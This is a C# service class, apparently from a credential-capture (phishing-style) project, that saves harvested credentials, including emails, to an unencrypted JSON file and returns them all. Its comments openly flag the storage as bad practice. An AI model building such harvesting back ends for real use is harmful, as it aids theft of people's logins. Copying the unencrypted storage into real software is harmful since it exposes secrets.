namespace CredentialCaptureService.Services;

using System.Text.Json;
using CredentialCaptureService.Models;

/**
 * JSON file-based credential storage
 * 
 * Improper practices shown:
 * - No encryption
 * - Simple JSON array
 */
public class CredentialService : ICredentialService
{
    private readonly string _logsDirectory;
    private readonly string _credentialsFile;
    private readonly ILogger<CredentialService> _logger;

    public CredentialService(IConfiguration config, ILogger<CredentialService> logger)
    {
        _logger = logger;
        _logsDirectory = config["CredentialCapture:LogsDirectory"] ?? ".";
        _credentialsFile = Path.Combine(_logsDirectory, config["CredentialCapture:CredentialsFilename"] ?? "captured_credentials.json");

        // Create directory if doesn't exist
        if (!Directory.Exists(_logsDirectory))
            Directory.CreateDirectory(_logsDirectory);
    }

    /// <summary>
    /// Save credential to JSON file
    /// </summary>
    public async Task SaveCredentialAsync(CapturedCredential credential)
    {
        try
        {
            List<CapturedCredential> credentials = new();

            // Read existing
            if (File.Exists(_credentialsFile))
            {
                var json = await File.ReadAllTextAsync(_credentialsFile);
                credentials = JsonSerializer.Deserialize<List<CapturedCredential>>(json) ?? new();
            }

            // Add new
            credentials.Add(credential);

            // Write back (overwrites entire file - not atomic!)
            var updatedJson = JsonSerializer.Serialize(credentials, new JsonSerializerOptions 
            { 
                WriteIndented = true 
            });
            
            await File.WriteAllTextAsync(_credentialsFile, updatedJson);

            _logger.LogInformation($"Credential saved for {credential.Email}");
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error saving credential");
            throw;
        }
    }

    /// <summary>
    /// Retrieve all captured credentials
    /// </summary>
    public async Task<List<CapturedCredential>> GetAllCredentialsAsync()
    {
        try
        {
            if (!File.Exists(_credentialsFile))
                return new();

            var json = await File.ReadAllTextAsync(_credentialsFile);
            return JsonSerializer.Deserialize<List<CapturedCredential>>(json) ?? new();
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error reading credentials");
            throw;
        }
    }
}
